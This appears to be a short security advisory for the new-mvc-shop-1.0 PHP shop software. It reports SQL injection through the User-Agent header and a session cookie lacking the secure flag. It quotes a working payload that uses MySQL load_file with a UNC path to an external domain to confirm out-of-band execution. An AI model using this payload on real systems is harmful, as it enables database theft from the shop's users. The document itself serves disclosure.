## Title: new-mvc-shop-1.0 - SQLi + SameSite attribute weak security PHPSESSID Hijacking
## Author: nu11secur1ty
## Date: 05.29.2023
## Vendor: https://chikoiquan.tanhongit.com/
## Software: https://github.com/tanhongit/new-mvc-shop/releases/tag/v1.0
## Reference: https://portswigger.net/web-security/sql-injection

## Description:
The `User-Agent` HTTP header appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\ttq1xmuilflmnv0pcl7cjdwb42avymmdp1koacz.pedal.com\\iqp'))+' was submitted in the User-Agent HTTP header. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can retrieve all information from the database of this system.
---------------------------------------------------------------------------------------------------------------
The following cookie was issued by the application and does not have the secure flag set:
PHPSESSID: The cookie appears to contain a session token, which may increase the risk associated with this issue. 
The malicious user can use one PHPSESSID to connect multiple times on the system using the same account session.
